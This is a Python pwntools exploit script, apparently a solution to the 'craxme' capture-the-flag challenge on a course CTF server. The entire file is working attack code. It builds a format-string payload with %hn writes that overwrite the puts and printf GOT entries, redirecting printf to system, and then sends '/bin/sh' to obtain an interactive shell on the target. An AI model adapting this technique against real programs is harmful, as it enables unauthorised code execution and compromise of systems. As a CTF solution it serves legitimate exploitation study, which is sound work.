#!/usr/bin/env python

from pwn import *
context.arch = 'amd64'

r = remote('csie.ctf.tw', 10134)
# r = process('./craxme')

puts_got = 0x601018
printf_got = 0x601030

system_plt = 0x4005a0
main_read = 0x400747
value1 = 0x40
value2 = 0x0747 - 0x40

prev = 0
def fmt(prev, target, i):
    if target < prev:
        return '%' + str((65536-prev) + target) + 'c%' + str(i) + '$hn'
    elif target > prev:
        return '%' + str(target-prev) + 'c%' + str(i) + '$hn'
    else:
        return '%' + str(i) + '$hn'


payload = ''
for i in range(4):
    payload += fmt(prev, (main_read >> i*16) & 0xffff, 18+i)
    prev = (main_read >> i*16) & 0xffff

for i in range(4):
    payload += fmt(prev, (system_plt >> i*16) & 0xffff, 18+4+i)
    prev = (system_plt >> i*16) & 0xffff

print "len:", hex(len(payload))
payload = payload.ljust(0x60, '\x00') + flat([puts_got, puts_got+2, puts_got+4, puts_got+6, printf_got, printf_got+2, printf_got+4, printf_got+6])

raw_input('#')
r.send(payload)
r.send('/bin/sh\x00')

r.interactive()

